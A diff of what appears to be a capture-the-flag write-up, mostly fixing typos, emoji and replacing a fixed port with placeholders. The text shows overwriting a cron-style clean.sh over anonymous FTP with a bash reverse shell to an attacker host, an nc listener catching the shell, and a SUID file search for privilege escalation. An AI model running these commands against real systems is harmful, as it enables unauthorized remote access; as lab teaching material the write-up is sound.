@@ -63,7 +63,7 @@ ftp> ls
 
 ftp> mget *
 ```
-Let's have a look on thos files.
+Let's have a look on those files.
 
 ```shell
 cat clean.sh 
@@ -97,14 +97,14 @@ Sure :smile: Let's have fun now and upload this simple script via ftp
 cat clean.sh
 
 #!/bin/bash
-bash -i >& /dev/tcp/AttackerIp/4242 0>&1
+bash -i >& /dev/tcp/<AttackerIp>/<Port_Number> 0>&1
 ```
 
 And on our side we just have to wait few seconds:
 
 ```shell
-rlwrap nc -nlvp 4242            
-listening on [any] 4242 ...
+rlwrap nc -nlvp <Port_Number>            
+listening on [any] <Port_Number> ...
 namelessone@anonymous:~$ 
 id
 uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
@@ -120,7 +120,7 @@ namelessone@anonymous:~$
 
 > HINT: This may require you to do some outside research
 
-Cheers ;) so as usual in this case, gtfobins comes in \o/
+Cool ! So as usual in this case, gtfobins comes in :point_left:
 
 ```shell
 find / -perm -u=s 2>/dev/null
